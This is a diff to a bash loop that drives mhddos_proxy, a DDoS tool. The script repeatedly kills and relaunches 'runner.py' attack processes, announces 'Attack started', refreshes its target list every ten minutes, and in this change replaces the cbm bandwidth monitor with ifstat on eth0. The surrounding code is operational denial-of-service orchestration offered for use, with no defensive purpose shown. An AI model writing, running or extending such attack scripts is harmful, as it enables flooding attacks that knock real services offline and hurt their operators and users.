@@ -25,7 +25,7 @@ proxy_interval="-p 600"
 #Just in case kill previous copy of mhddos_proxy
 pkill -f runner.py
 pkill -f ./start.py
-pkill -f cbm
+pkill -f ifstat
 
 # Restart attacks and update targets list every 10 minutes (by default)
 while [[ 1 == 1 ]]
@@ -53,8 +53,9 @@ do
             python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
             echo -e "Attack started. Wait a few minutes for output"
    done
-   
-   cbm&
+
+   echo -e "\nDDoS is monitoring eth0 interface (HH:MM:SS | KB/s in | KB/s out)"
+   ifstat -i eth0 -t 60/30&
 
    echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
    sleep $restart_interval
@@ -62,6 +63,6 @@ do
    echo -e "\nRESTARTING\nKilling old processes..."
    pkill -f runner.py
    pkill -f ./start.py
-   pkill -f cbm
+   pkill -f ifstat
    echo -e "\nOld processes have been killed - starting new ones"
 done
